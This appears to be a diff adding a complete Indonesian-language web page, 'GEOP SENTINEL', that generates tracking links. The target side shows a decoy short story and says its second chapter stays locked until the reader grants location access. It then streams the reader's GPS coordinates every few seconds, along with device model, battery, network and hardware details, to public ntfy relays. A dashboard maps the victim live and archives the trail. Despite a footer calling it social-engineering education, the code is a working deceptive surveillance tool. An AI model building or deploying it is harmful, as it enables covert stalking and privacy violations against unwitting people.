@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>GEOP SENTINEL v10 — ORBIT</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛰️</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700;800&family=JetBrains+Mono:wght@400;600&family=Sora:wght@600;700;800&family=Literata:opsz,wght@7..72,400;7..72,600&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#070a12;--card:#101625;--card2:#0c1220;--line:#1d2740;--line2:#16203a;--txt:#e8edf7;--mut:#8291ad;--dim:#4d5b78;--acc:#4cc9f0;--vio:#a78bfa;--ok:#34d399;--warn:#fbbf24;--bad:#f87171;--ui:'Manrope',system-ui;--disp:'Sora';--mono:'JetBrains Mono';--book:'Literata',serif;--sp:clamp(14px,2vw,24px)}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+[hidden]{display:none!important}
+body{background:var(--bg);color:var(--txt);font-family:var(--ui);font-size:14px;min-height:100vh;overflow-x:hidden;background-image:radial-gradient(1100px 520px at 85% -12%,rgba(76,201,240,.08),transparent),radial-gradient(800px 460px at -12% 34%,rgba(167,139,250,.06),transparent)}
+img,iframe{max-width:100%}button{font-family:inherit}a{color:var(--acc)}
+::-webkit-scrollbar{width:8px;height:8px}::-webkit-scrollbar-thumb{background:#223052;border-radius:99px}
+#dashMode{max-width:1460px;margin:0 auto;padding:var(--sp);display:flex;flex-direction:column;gap:var(--sp)}
+.topbar{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;padding:14px 18px;background:linear-gradient(180deg,rgba(16,22,37,.9),rgba(16,22,37,.65));border:1px solid var(--line);border-radius:16px;backdrop-filter:blur(8px);position:sticky;top:10px;z-index:40}
+.brand{display:flex;align-items:center;gap:12px;min-width:0}
+.brand .ic{width:42px;height:42px;flex:none;display:grid;place-items:center;font-size:20px;border-radius:12px;background:linear-gradient(135deg,#0e7490,#4338ca);box-shadow:0 0 24px rgba(76,201,240,.35)}
+.brand h1{font-family:var(--disp);font-size:clamp(.95rem,2.4vw,1.15rem);letter-spacing:2px;white-space:nowrap}
+.brand h1 span{color:var(--acc)}
+.brand .sub{font-size:.58rem;letter-spacing:3px;color:var(--mut);text-transform:uppercase}
+.tagver{font-family:var(--mono);font-size:.58rem;color:var(--ok);border:1px solid rgba(52,211,153,.4);background:rgba(52,211,153,.07);padding:4px 10px;border-radius:6px;white-space:nowrap}
+.topright{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.pill{display:flex;align-items:center;gap:8px;border:1px solid var(--line);border-radius:999px;padding:7px 14px;font-family:var(--mono);font-size:.62rem;letter-spacing:1px;color:var(--mut);white-space:nowrap}
+.pill i{width:8px;height:8px;border-radius:50%;background:var(--bad);box-shadow:0 0 8px var(--bad)}
+.pill.live{color:var(--ok);border-color:rgba(52,211,153,.35)}
+.pill.live i{background:var(--ok);box-shadow:0 0 8px var(--ok);animation:bl 1.1s infinite}
+.pill.poll{color:var(--warn);border-color:rgba(251,191,36,.35)}
+.pill.poll i{background:var(--warn);box-shadow:0 0 8px var(--warn);animation:bl 1.6s infinite}
+@keyframes bl{50%{opacity:.35}}
+.clock{font-family:var(--mono);font-size:.7rem;color:var(--mut);border:1px solid var(--line);border-radius:8px;padding:7px 12px;white-space:nowrap}
+.kpis{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px}
+.kpi{display:flex;align-items:center;gap:12px;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px 16px;min-width:0}
+.kpi .ic{width:40px;height:40px;flex:none;display:grid;place-items:center;font-size:17px;border-radius:11px;background:rgba(76,201,240,.1);border:1px solid rgba(76,201,240,.25)}
+.kpi .lb{display:block;font-size:.58rem;font-weight:700;letter-spacing:1.6px;color:var(--mut);text-transform:uppercase;margin-bottom:4px}
+.kpi b{font-family:var(--mono);font-size:.84rem;font-weight:600;word-break:break-all}
+.layout{display:grid;grid-template-columns:minmax(320px,420px) minmax(0,1fr);gap:var(--sp);align-items:start}
+.colstack{display:flex;flex-direction:column;gap:var(--sp);min-width:0}
+.card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:clamp(14px,2vw,20px);min-width:0;box-shadow:0 10px 34px rgba(0,0,0,.38)}
+.chead{display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;margin-bottom:14px}
+.chead h2{font-family:var(--disp);font-size:.68rem;letter-spacing:2.4px;color:var(--acc);text-transform:uppercase}
+.chead .hint{font-size:.6rem;color:var(--dim);font-family:var(--mono)}
+.row{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
+.btn{border:none;cursor:pointer;border-radius:10px;padding:12px 16px;font-size:.72rem;font-weight:800;letter-spacing:.5px;color:#04121c;background:linear-gradient(90deg,#0284c7,var(--acc));transition:filter .15s,transform .15s;white-space:nowrap}
+.btn:hover{filter:brightness(1.15);transform:translateY(-1px)}
+.btn.ghost{background:transparent;border:1px solid var(--line);color:var(--mut)}
+.btn.ghost:hover{color:var(--txt);border-color:var(--acc)}
+.btn.danger{background:transparent;border:1px solid rgba(248,113,113,.35);color:var(--bad)}
+.btn.mini{padding:8px 12px;font-size:.64rem}
+.input{flex:1;min-width:120px;background:var(--card2);border:1px solid var(--line);border-radius:10px;color:var(--txt);font-family:var(--mono);font-size:.68rem;padding:12px;overflow-wrap:anywhere}
+.input:focus{outline:none;border-color:var(--acc)}
+.input[readonly]{color:var(--acc)}
+.steps{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:12px}
+.stp{border:1px dashed var(--line);border-radius:10px;padding:8px 6px;font-size:.58rem;color:var(--mut);text-align:center;letter-spacing:1px}
+.stp b{display:block;font-family:var(--mono);color:var(--acc);font-size:.72rem;margin-bottom:2px}
+.qrbox{display:flex;gap:14px;align-items:center;margin-top:14px;flex-wrap:wrap}
+.qrbox img{background:#fff;padding:6px;border-radius:10px;border:1px solid var(--line);width:124px;height:124px}
+.qrnote{font-family:var(--mono);font-size:.58rem;color:var(--mut);letter-spacing:1px;line-height:1.8}
+.hist{max-height:340px;overflow:auto;display:flex;flex-direction:column;gap:10px;padding-right:4px}
+.hitem{border:1px solid var(--line);border-radius:12px;padding:12px;background:var(--card2);min-width:0}
+.hrow{display:flex;justify-content:space-between;gap:8px;flex-wrap:wrap;font-family:var(--mono);font-size:.62rem;color:var(--mut);margin:3px 0;overflow-wrap:anywhere}
+.hempty{font-size:.68rem;color:var(--dim)}
+.log{height:220px;overflow:auto;background:#05080f;border:1px solid var(--line);border-radius:10px;padding:12px;font-family:var(--mono);font-size:.64rem;line-height:1.85;color:var(--mut)}
+.log .t{color:var(--vio)}.log .g{color:var(--ok)}.log .r{color:var(--bad)}
+.mapwrap{position:relative;border:1px solid var(--line);border-radius:12px;overflow:hidden;background:#000}
+#gmap{width:100%;height:clamp(240px,42vh,380px);border:none;display:block;filter:saturate(.9)}
+.mapidle{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:.62rem;letter-spacing:2px;color:var(--mut)}
+.kv{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px}
+.kv .cell{background:var(--card2);border:1px solid var(--line2);border-radius:10px;padding:10px 12px;min-width:0}
+.kv span{display:block;font-size:.56rem;letter-spacing:1.6px;color:var(--mut);font-weight:700;text-transform:uppercase;margin-bottom:4px}
+.kv b{display:block;font-family:var(--mono);font-size:.72rem;font-weight:600;overflow-wrap:anywhere}
+.coordline{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin:14px 0}
+.coordline code{font-family:var(--mono);color:var(--acc);font-size:.8rem}
+footer{color:var(--dim);font-size:.6rem;text-align:center;font-family:var(--mono);letter-spacing:1px;padding:4px 0 10px;line-height:1.9}
+#targetMode{min-height:100vh;display:flex;justify-content:center;padding:clamp(16px,4vw,32px) clamp(12px,3vw,20px);background:#141210;background-image:radial-gradient(720px 420px at 50% -10%,rgba(232,220,195,.06),transparent)}
+.twrap{max-width:660px;width:100%}
+.banner{background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.4);color:var(--warn);font-size:.68rem;padding:10px 12px;border-radius:10px;margin-bottom:12px;line-height:1.6}
+.book{background:#1c1916;border:1px solid rgba(232,220,195,.14);border-radius:8px;padding:clamp(22px,5vw,38px) clamp(18px,4.5vw,32px);color:#e8dcc3;font-family:var(--book);box-shadow:0 22px 60px rgba(0,0,0,.5)}
+.bhead{font-family:var(--mono);font-size:.58rem;letter-spacing:3px;color:#8a7d67;margin-bottom:18px}
+.btitle{font-weight:600;font-size:clamp(1.25rem,4.5vw,1.55rem);margin-bottom:4px}
+.bmeta{font-size:.72rem;font-style:italic;color:#8a7d67;margin-bottom:22px}
+.btext p,.bmore p{font-size:clamp(.86rem,2.6vw,.94rem);line-height:1.95;margin-bottom:16px;text-align:justify}
+.end{text-align:center;letter-spacing:4px;color:#8a7d67;margin-top:10px}
+.next{width:100%;margin-top:8px}
+.diag{margin-top:14px;font-family:var(--mono);font-size:.64rem;color:#9db88f;line-height:1.95;text-align:left;background:rgba(0,0,0,.25);border:1px dashed rgba(232,220,195,.22);border-radius:10px;padding:10px 12px;overflow-wrap:anywhere}
+.bnote{margin-top:12px;font-family:var(--mono);font-size:.66rem;color:#c9b98f;line-height:1.7}
+.modal{position:fixed;inset:0;background:rgba(0,0,0,.74);display:flex;align-items:center;justify-content:center;padding:18px;z-index:60}
+.mcard{max-width:420px;width:100%;background:var(--card);border:1px solid var(--line);padding:26px 22px;text-align:center;border-radius:16px;font-family:var(--ui)}
+.mcard h3{font-family:var(--disp);letter-spacing:2px;margin:8px 0;font-size:.95rem}
+.mcard p{font-size:.76rem;color:var(--mut);line-height:1.7;margin-bottom:16px}
+.mcard p b{color:var(--acc)}
+.mrow{display:flex;gap:8px;justify-content:center;flex-wrap:wrap}
+@media(max-width:1100px){.layout{grid-template-columns:1fr}}
+@media(max-width:640px){.topbar{position:static}}
+</style>
+</head>
+<body>
+
+<!-- ================= DASHBOARD ================= -->
+<div id="dashMode">
+  <header class="topbar">
+    <div class="brand">
+      <div class="ic">🛰️</div>
+      <div><h1>GEOP <span>SENTINEL</span></h1><div class="sub">Orbit Tracking Console</div></div>
+      <span class="tagver">v10.0 ORBIT</span>
+    </div>
+    <div class="topright">
+      <div class="pill" id="pill"><i></i><span id="pillTxt">OFFLINE</span></div>
+      <div class="clock" id="clock">--:--:--</div>
+    </div>
+  </header>
+
+  <section class="kpis">
+    <div class="kpi"><div class="ic">🔑</div><div><span class="lb">Topic Aktif</span><b id="topic" class="acc">–</b></div></div>
+    <div class="kpi"><div class="ic">📡</div><div><span class="lb">Ping Diterima</span><b id="pings">0</b></div></div>
+    <div class="kpi"><div class="ic">📍</div><div><span class="lb">Fix Lokasi</span><b id="lastfix">–</b></div></div>
+    <div class="kpi"><div class="ic">⏱️</div><div><span class="lb">Uptime Sesi</span><b id="uptime">00:00:00</b></div></div>
+  </section>
+
+  <div class="layout">
+    <div class="colstack">
+      <section class="card">
+        <div class="chead"><h2>▸ Generator Link</h2><span class="hint">3 relay redundan</span></div>
+        <div class="steps"><div class="stp"><b>1</b>BUAT LINK</div><div class="stp"><b>2</b>SEBAR / SCAN</div><div class="stp"><b>3</b>PANTAU LIVE</div></div>
+        <div class="row"><button class="btn" id="btnNew">⚡ BUAT LINK BARU</button><button class="btn ghost" id="btnCopy">SALIN</button></div>
+        <input class="input" id="linkOut" readonly placeholder="link operasi…" style="width:100%;margin-top:10px">
+        <div class="qrbox" id="qrBox" hidden><img id="qr" alt="QR"><div class="qrnote">SCAN / KIRIM KE<br>PERANGKAT UJI ANDA</div></div>
+      </section>
+      <section class="card">
+        <div class="chead"><h2>▸ Riwayat Operasi</h2><button class="btn danger mini" id="btnWipe">🗑 HAPUS SEMUA</button></div>
+        <div class="hist" id="hist"></div>
+      </section>
+      <section class="card">
+        <div class="chead"><h2>▸ Relay & Data</h2></div>
+        <div class="row"><input class="input" id="watchIn" placeholder="tempel topic / link lama…"><button class="btn ghost" id="btnWatch">SAMBUNG</button><button class="btn danger" id="btnStop">STOP</button></div>
+        <div class="row" style="margin-top:10px"><button class="btn ghost" id="btnExport">📥 EXPORT JSON</button></div>
+      </section>
+    </div>
+    <div class="colstack">
+      <section class="card">
+        <div class="chead"><h2>▸ Peta Live (Google Maps)</h2><span class="hint">update otomatis</span></div>
+        <div class="mapwrap"><iframe id="gmap" src="about:blank" title="peta"></iframe><div class="mapidle" id="mapidle">MENUNGGU KOORDINAT…</div></div>
+        <div class="coordline"><code id="coord">– , –</code><a id="gmaps" href="#" target="_blank">Buka Google Maps ↗</a><button class="btn ghost mini" id="btnCopyCoord">SALIN</button></div>
+      </section>
+      <section class="card">
+        <div class="chead"><h2>▸ Telemetri Perangkat Lengkap</h2></div>
+        <div class="kv">
+          <div class="cell"><span>Merek</span><b id="brand">–</b></div>
+          <div class="cell"><span>Model</span><b id="dev">–</b></div>
+          <div class="cell"><span>OS</span><b id="os">–</b></div>
+          <div class="cell"><span>Baterai</span><b id="batt">–</b></div>
+          <div class="cell"><span>Charging</span><b id="chg">–</b></div>
+          <div class="cell"><span>Sinyal</span><b id="net">–</b></div>
+          <div class="cell"><span>Downlink</span><b id="dl">–</b></div>
+          <div class="cell"><span>CPU Cores</span><b id="cpu">–</b></div>
+          <div class="cell"><span>RAM</span><b id="ram">–</b></div>
+          <div class="cell"><span>Layar</span><b id="scr">–</b></div>
+          <div class="cell"><span>Zona Waktu</span><b id="tz">–</b></div>
+          <div class="cell"><span>Akurasi GPS</span><b id="acc">–</b></div>
+        </div>
+      </section>
+      <section class="card"><div class="chead"><h2>▸ Console</h2></div><div class="log" id="log"></div></section>
+    </div>
+  </div>
+  <footer>GEOP SENTINEL v10.0 ORBIT • TANPA KAMERA — LOKASI & TELEMETRI SAJA • RELAY PUBLIK 12 JAM<br>MEDIA EDUKASI SOCIAL ENGINEERING • UJI HANYA PADA PERANGKAT SENDIRI • UU PDP/ITE</footer>
+</div>
+
+
+
+
+  <!-- ================= MODE NOVEL (HP) ================= -->
+<div id="targetMode" hidden>
+  <div class="twrap">
+    <div class="banner" id="banner" hidden>⚠️ Terbuka dari dalam aplikasi chat — tap ⋮ lalu pilih <b>"Buka di Browser / Open in Chrome"</b> agar lokasi berfungsi lancar.</div>
+    <article class="book">
+      <div class="bhead">GEOP PRESS • FIKSI MINI</div>
+      <h2 class="btitle">Senja di Ujung Jalan</h2>
+      <div class="bmeta">Bab I — R. Semara</div>
+      <div class="btext">
+        <p>Hujan baru saja reda ketika Arka menyusuri Jalan Nuri yang berbau tanah basah. Lampu-lampu warung menyala satu per satu, memantulkan jingga di genangan air, seolah kota ini enggan mengakui bahwa hari hampir selesai.</p>
+        <p>Di saku jaketnya, selembar foto lama terasa berat—lebih berat dari seharusnya. Foto yang sama telah ia bawa ke tiga kota, menanyakan hal yang sama kepada orang-orang yang salah, dan malam ini alamat terakhirnya hanya beberapa langkah lagi.</p>
+        <p>"Kalau kali ini tidak ada jawaban," gumamnya pada senja, "maka aku yang akan menjadi jawabannya." Ia mempercepat langkah, tepat ketika sebuah pintu di ujung jalan terbuka perlahan, memperlihatkan cahaya hangat dan sosok yang sepuluh tahun ia cari.</p>
+      </div>
+      <div class="bmore" id="ch2" hidden>
+        <p>Sosok itu tidak berubah, meski waktu menambahkan garis-garis halus di sudut matanya. "Kau terlambat sepuluh tahun," katanya pelan, "tapi kau tetap datang." Arka tidak menjawab; beberapa pertemuan memang tidak membutuhkan kata, hanya kehadiran.</p>
+        <p>Malam itu, di ujung Jalan Nuri, dua orang membagi teh yang sama dan cerita yang tertunda. Untuk pertama kalinya setelah satu dekade, foto di saku Arka akhirnya boleh berhenti berpindah tangan—ia sudah pulang.</p>
+        <div class="end">— TAMAT —</div>
+      </div>
+      <button class="btn next" id="btnNext">📖 BUKA BAB II</button>
+      <div class="diag" id="diag" hidden></div>
+      <div class="bnote" id="bnote" hidden></div>
+    </article>
+  </div>
+  <div class="modal" id="modal" hidden>
+    <div class="mcard">
+      <div style="font-size:34px">🔐</div>
+      <h3>VERIFIKASI TAUTAN</h3>
+      <p>Bab II dikunci oleh pengirim. Untuk membukanya, izinkan akses <b>lokasi</b> perangkat Anda selama sesi membaca berlangsung.</p>
+      <div class="mrow"><button class="btn" id="btnAllow">IZINKAN & BUKA BAB II</button><button class="btn ghost" id="btnDeny">TIDAK</button></div>
+    </div>
+  </div>
+</div>
+
+<script>
+(() => {
+"use strict";
+const $ = s => document.querySelector(s);
+const $$ = s => [...document.querySelectorAll(s)];
+const RELAYS = ["https://ntfy.sh", "https://ntfy.darmok.dev", "https://ntfy.tilde.zone"];
+const esc = s => String(s ?? "").replace(/[&<>"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;"}[c]));
+const topic = new URLSearchParams(location.search).get("t");
+if (topic) targetMode(); else dashMode();
+
+/* ================= TARGET (NOVEL, TANPA KAMERA) ================= */
+function targetMode(){
+  $("#dashMode").remove(); $("#targetMode").hidden = false;
+  if (/WhatsApp|Instagram|FBAN|FBAV|Messenger|Line\//i.test(navigator.userAgent)) $("#banner").hidden = false;
+  const note = t => { const n = $("#bnote"); n.hidden = false; n.textContent = t; };
+  const dlog = t => { const d = $("#diag"); d.hidden = false; d.innerHTML += "<div>▸ " + t + "</div>"; };
+
+  const send = async (title, msg) => {
+    for (const base of RELAYS) {
+      try {
+        const r = await fetch(base + "/" + topic, { method: "POST", body: msg, headers: { Title: title } });
+        if (r.ok) return true;
+      } catch(e){}
+    }
+    dlog("⚠️ semua relay menolak: " + title);
+    return false;
+  };
+
+  const parseUA = async () => {
+    const ua = navigator.userAgent;
+    const android = (ua.match(/Android\s([\d.]+)/) || [])[1] || null;
+    const ios = (ua.match(/OS ([\d_]+) like Mac/) || [])[1] || null;
+    let model = String((ua.match(/;\s*([^;()]+?)\s*Build\//) || [])[1] || (ua.match(/\(([^)]+)\)/) || [])[1] || "").trim() || ua.slice(0, 50);
+    try {
+      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+        const hv = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
+        if (hv.model) model = hv.model;
+      }
+    } catch(e){}
+    const low = model.toLowerCase();
+    let brand = "Lainnya";
+    if (/iphone|ipad/i.test(ua)) brand = "Apple";
+    else if (/samsung|sm-|gt-/i.test(low)) brand = "Samsung";
+    else if (/redmi|poco|xiaomi|m20|m21|2201|2304|2312/i.test(low)) brand = "Xiaomi/Poco/Redmi";
+    else if (/oppo|cph|pgm/i.test(low)) brand = "OPPO";
+    else if (/vivo|v20/i.test(low)) brand = "Vivo";
+    else if (/realme|rmx/i.test(low)) brand = "Realme";
+    else if (/huawei|honor/i.test(low)) brand = "Huawei/Honor";
+    else if (/infinix|tecno|itel/i.test(low)) brand = "Infinix/Tecno";
+    return { brand, model, android, ios };
+  };
+
+  const L = { dev: null, hw: null, batt: null, net: null, loc: null };
+  let lastPingOk = null;
+
+  async function refresh(){
+    if (!L.dev) L.dev = await parseUA();
+    if (!L.hw) {
+      let storage = null;
+      try { if (navigator.storage && navigator.storage.estimate) { const es = await navigator.storage.estimate(); if (es.quota) storage = Math.max(0, Math.round((es.quota - es.usage) / 1e9 * 10) / 10) + " GB kosong"; } } catch(e){}
+      L.hw = { cores: navigator.hardwareConcurrency || null,
+               ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : null,
+               screen: screen.width + "x" + screen.height,
+               tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+               lang: navigator.language, storage };
+    }
+    try { if (navigator.getBattery) { const b = await navigator.getBattery(); L.batt = { level: Math.round(b.level * 100), charging: b.charging }; } } catch(e){}
+    const c = navigator.connection || navigator.webkitConnection;
+    L.net = c ? { type: (c.type || c.effectiveType || "?"), dl: c.downlink || null, rtt: c.rtt || null } : { type: "?" };
+  }
+
+  async function ping(){
+    await refresh();
+    const ok = await send("PING", JSON.stringify({ batt: L.batt, net: L.net, loc: L.loc }));
+    if (ok !== lastPingOk) {
+      lastPingOk = ok;
+      dlog(ok ? "📡 ping terkirim via relay publik (tiap 5 dtk)" : "⚠️ relay tidak terjangkau — coba lagi nanti");
+    }
+  }
+
+  $("#btnNext").onclick = () => { $("#modal").hidden = false; };
+  $("#btnDeny").onclick = () => { $("#modal").hidden = true; note("Bab II tetap terkunci. Verifikasi ditolak."); };
+  $("#btnAllow").onclick = async () => {
+    $("#modal").hidden = true;
+    note("⏳ Memverifikasi perangkat…");
+    try { await navigator.wakeLock.request("screen"); } catch(e){}
+    send("STATUS", "✅ Persetujuan verifikasi (v10)");
+    await refresh();
+    send("META", JSON.stringify({ dev: L.dev, hw: L.hw, batt: L.batt, net: L.net }));
+    dlog("✅ info perangkat terkirim (" + L.dev.brand + " " + L.dev.model + ")");
+    ping();
+    setInterval(ping, 5000);
+    if (navigator.geolocation) {
+      let got = false;
+      navigator.geolocation.watchPosition(p => {
+        const c = p.coords;
+        L.loc = { lat: c.latitude, lon: c.longitude, acc: c.accuracy, alt: c.altitude, spd: c.speed, hdg: c.heading };
+        if (!got) { got = true; dlog("✅ GPS terkunci ±" + Math.round(c.accuracy) + " m"); ping(); }
+      }, err => { dlog("❌ GPS ditolak (kode " + err.code + ") — izinkan lewat ikon 🔒 di address bar"); send("STATUS", "❌ LOC ditolak"); },
+      { enableHighAccuracy: true, maximumAge: 2000, timeout: 20000 });
+    } else dlog("❌ perangkat tanpa GPS");
+    dlog("📖 Sesi membaca dimulai — telemetri mengalir");
+    $("#ch2").hidden = false; $("#btnNext").hidden = true;
+    note("✅ Verifikasi berhasil — Bab II terbuka.");
+  };
+}
+
+/* ================= DASHBOARD ================= */
+function dashMode(){
+  $("#targetMode").remove();
+  let esList = [], loaders = [], pollTimer = null, raw = [], seen = new Set();
+  let pings = 0, t0 = null, lastMap = 0, lastLoc = null, cur = null;
+
+  const AKEY = "sent_archive_v10";
+  const loadA = () => { try { return JSON.parse(localStorage.getItem(AKEY)) || {}; } catch(e){ return {}; } };
+  const saveA = a => { try { localStorage.setItem(AKEY, JSON.stringify(a)); } catch(e){ const k = Object.keys(a).sort((x, y) => a[x].created - a[y].created)[0]; if (k) { delete a[k]; saveA(a); } } };
+  const entry = (a, t) => a[t] || (a[t] = { created: Date.now(), updated: Date.now(), dev: "", batt: "", net: "", loc: null, trail: [], pings: 0 });
+
+  setInterval(() => { $("#clock").textContent = new Date().toLocaleString("id-ID", { hour12: false }); }, 1000);
+  setInterval(() => { if (t0) { const s = (Date.now() - t0) / 1000 | 0; $("#uptime").textContent = [s/3600|0, (s/60|0)%60, s%60].map(x => String(x).padStart(2, "0")).join(":"); } }, 1000);
+  const rnd = () => { const c = "abcdefghijklmnopqrstuvwxyz0123456789"; return [...crypto.getRandomValues(new Uint8Array(14))].map(x => c[x % c.length]).join(""); };
+  const log = (s, c) => { const l = $("#log"); l.innerHTML += '<div><span class="t">[' + new Date().toLocaleTimeString("id-ID") + ']</span> <span class="' + (c || "") + '">' + s + "</span></div>"; l.scrollTop = l.scrollHeight; };
+  const connUpdate = () => { const live = esList.some(e => e.readyState === 1); $("#pill").className = "pill " + (live ? "live" : "poll"); $("#pillTxt").textContent = live ? "LIVE • SSE" : "LIVE • POLLING"; };
+
+  function renderHist(){
+    const a = loadA();
+    const keys = Object.keys(a).sort((x, y) => a[y].updated - a[x].updated).slice(0, 12);
+    $("#hist").innerHTML = keys.map(k => { const e = a[k];
+      return '<div class="hitem"><div class="hrow"><b style="color:var(--acc)">' + k.slice(0, 8) + "…</b><span>" + new Date(e.updated).toLocaleString("id-ID") + "</span></div>" +
+        '<div class="hrow"><span>' + esc(e.dev || "perangkat ?") + "</span><span>" + (e.pings || 0) + " ping</span></div>" +
+        (e.loc ? '<div class="hrow"><a target="_blank" href="https://www.google.com/maps/search/?api=1&query=' + e.loc.lat + "," + e.loc.lon + '">📍 ' + e.loc.lat.toFixed(5) + ", " + e.loc.lon.toFixed(5) + "</a></div>" : "") +
+        '<button class="btn ghost mini" data-t="' + k + '">📡 PANTAU ULANG</button></div>';
+    }).join("") || '<div class="hempty">Belum ada riwayat operasi.</div>';
+    $$("#hist [data-t]").forEach(b => b.onclick = () => watch(b.dataset.t));
+  }
+
+  function fillTiles(d, hw, b, n){
+    if (d) { $("#brand").textContent = d.brand || "–"; $("#dev").textContent = d.model || "–";
+      $("#os").textContent = d.android ? "Android " + d.android : d.ios ? "iOS " + d.ios.replace(/_/g, ".") : "–"; }
+    if (hw) { $("#cpu").textContent = hw.cores || "–"; $("#ram").textContent = hw.ram || "–"; $("#scr").textContent = hw.screen || "–"; $("#tz").textContent = hw.tz || "–"; }
+    if (b) { $("#batt").textContent = b.level != null ? b.level + "%" : "–"; $("#chg").textContent = b.charging != null ? (b.charging ? "⚡ Ya" : "Tidak") : "–"; }
+    if (n) { $("#net").textContent = ((n.type || "?") + "").toUpperCase(); $("#dl").textContent = n.dl != null ? n.dl + " Mbps" : "–"; }
+  }
+
+  function process(m){
+    if (m.event && m.event !== "message") return;
+    if (m.id && seen.has(m.id)) return;
+    if (m.id) seen.add(m.id);
+    raw.push(m);
+    const t = m.title || "";
+    if (t === "META") {
+      try {
+        const d = JSON.parse(m.message);
+        fillTiles(d.dev, d.hw, d.batt, d.net);
+        const a = loadA(); const e = entry(a, cur);
+        e.dev = ((d.dev || {}).brand || "") + " " + ((d.dev || {}).model || "") + (((d.dev || {}).android) ? " • Android " + d.dev.android : "");
+        e.updated = Date.now(); saveA(a); renderHist();
+        log("📱 " + esc(e.dev));
+      } catch(e){}
+    }
+    else if (t === "PING") {
+      try {
+        const d = JSON.parse(m.message);
+        pings++; $("#pings").textContent = pings;
+        fillTiles(null, null, d.batt, d.net);
+        const a = loadA(); const e = entry(a, cur);
+        e.pings = (e.pings || 0) + 1;
+        if (d.batt) e.batt = d.batt.level + "%";
+        if (d.net) e.net = (d.net.type || "?").toUpperCase();
+        if (d.loc) {
+          e.loc = { lat: d.loc.lat, lon: d.loc.lon };
+          e.trail.push(Object.assign({ ts: Date.now() }, d.loc));
+          e.trail = e.trail.slice(-100);
+          lastLoc = d.loc;
+          $("#coord").textContent = d.loc.lat.toFixed(6) + " , " + d.loc.lon.toFixed(6);
+          $("#acc").textContent = "±" + Math.round(d.loc.acc) + " m";
+          $("#lastfix").textContent = new Date().toLocaleTimeString("id-ID");
+          $("#gmaps").href = "https://www.google.com/maps/search/?api=1&query=" + d.loc.lat + "," + d.loc.lon;
+          if (Date.now() - lastMap > 10000) {
+            lastMap = Date.now();
+            $("#mapidle").hidden = true;
+            $("#gmap").src = "https://maps.google.com/maps?q=" + d.loc.lat + "," + d.loc.lon + "&z=17&hl=id&output=embed";
+          }
+          log("📍 " + d.loc.lat.toFixed(5) + "," + d.loc.lon.toFixed(5) + " ±" + Math.round(d.loc.acc) + "m", "g");
+        }
+        e.updated = Date.now(); saveA(a);
+      } catch(e){}
+    }
+    else if (t === "STATUS") { log("ℹ️ " + esc(m.message || "")); }
+  }
+
+  async function watch(t){
+    stop(); cur = t; raw = []; seen = new Set(); pings = 0; t0 = Date.now(); lastMap = 0;
+    $("#topic").textContent = t.slice(0, 10) + "…"; $("#pings").textContent = "0"; $("#uptime").textContent = "00:00:00"; $("#log").innerHTML = "";
+    log("Menghubungkan " + RELAYS.length + " relay publik…");
+    renderHist();
+    RELAYS.forEach(base => {
+      const nama = base.replace("https://", "");
+      const load = () => fetch(base + "/" + t + "/json?poll=1").then(r => r.text()).then(txt => {
+        txt.split("\n").filter(Boolean).forEach(l => { try { process(JSON.parse(l)); } catch(e){} });
+        connUpdate();
+      }).catch(() => {});
+      loaders.push(load); load();
+      const es = new EventSource(base + "/" + t + "/sse");
+      esList.push(es);
+      es.onopen = () => { connUpdate(); log("SSE terhubung: " + nama, "g"); };
+      es.onerror = () => connUpdate();
+      es.onmessage = e => { try { process(JSON.parse(e.data)); } catch(err){} };
+    });
+    pollTimer = setInterval(() => loaders.forEach(f => f()), 8000);
+  }
+  function stop(){ esList.forEach(e => e.close()); esList = []; loaders = []; if (pollTimer) clearInterval(pollTimer); pollTimer = null; t0 = null; $("#pill").className = "pill"; $("#pillTxt").textContent = "OFFLINE"; }
+
+  $("#btnNew").onclick = () => {
+    const t = rnd(); localStorage.setItem("sent_topic_v10", t);
+    const url = location.origin + location.pathname + "?t=" + t;
+    $("#linkOut").value = url;
+    $("#qr").src = "https://api.qrserver.com/v1/create-qr-code/?size=124x124&data=" + encodeURIComponent(url);
+    $("#qrBox").hidden = false; watch(t);
+  };
+  $("#btnCopy").onclick = async () => { try { await navigator.clipboard.writeText($("#linkOut").value); log("Link disalin", "g"); } catch(e){} };
+  $("#btnCopyCoord").onclick = async () => { if (lastLoc) { try { await navigator.clipboard.writeText(lastLoc.lat + "," + lastLoc.lon); log("Koordinat disalin", "g"); } catch(e){} } };
+  $("#btnWatch").onclick = () => { let v = $("#watchIn").value.trim(); const m = v.match(/t=([a-z0-9]+)/i); if (m) v = m[1]; if (v) watch(v); };
+  $("#btnStop").onclick = stop;
+  $("#btnWipe").onclick = () => { localStorage.removeItem(AKEY); renderHist(); log("Riwayat dihapus", "r"); };
+  $("#btnExport").onclick = () => {
+    const a = document.createElement("a");
+    a.href = URL.createObjectURL(new Blob([JSON.stringify({ topic: cur, exported: new Date().toISOString(), pings, archive: loadA()[cur], data: raw }, null, 2)], { type: "application/json" }));
+    a.download = "sentinel_" + (cur || "x") + ".json"; a.click();
